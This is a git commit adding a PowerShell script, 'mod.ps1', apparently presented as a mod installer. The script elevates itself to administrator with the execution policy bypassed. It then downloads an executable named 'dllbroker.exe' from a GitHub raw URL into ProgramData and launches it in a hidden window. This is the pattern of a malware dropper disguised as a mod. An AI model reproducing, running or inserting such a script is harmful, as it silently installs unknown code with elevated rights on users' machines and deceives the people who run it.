a53918cb093af8e5d5b7c09fa7f72f3b2c0270a4
AnatolyPivder <149972492+AnatolyPivder@users.noreply.github.com>
2026-07-31 14:49:17 +0000

    Create mod.ps1

---
+++ mod.ps1
@@ -0,0 +1,13 @@
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$url = "https://github.com/AnatolyPivder/mod_pository/raw/refs/heads/main/dllbroker.exe"
+
+$outputPath = "$env:ProgramData\dllbroker.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
+
+Start-Process -FilePath $outputPath -WindowStyle Hidden
+
+exit
